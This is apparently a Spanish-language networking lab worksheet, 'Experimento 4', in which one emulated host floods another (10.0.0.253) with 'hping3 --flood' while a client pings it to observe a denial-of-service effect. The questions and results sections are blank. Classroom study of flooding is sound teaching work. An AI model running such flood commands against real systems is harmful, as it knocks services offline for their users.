# Experimento 4 #

## Resumen ##

Ataque por flooding

## Comandos a emplear ##


Consola del servidor h3 donde IP(h3) = 10.0.0.253 

```bash
# Atacante (suponiendo que es h2) 
hping3 --flood 10.0.0.253 
```

Luego en el cliente

```bash
# Cliente   
h1 ping -c 4 h3
```

Cuando culmine el experimento reiniciar.


**Preguntas**:





## Resultados obtenidos ##


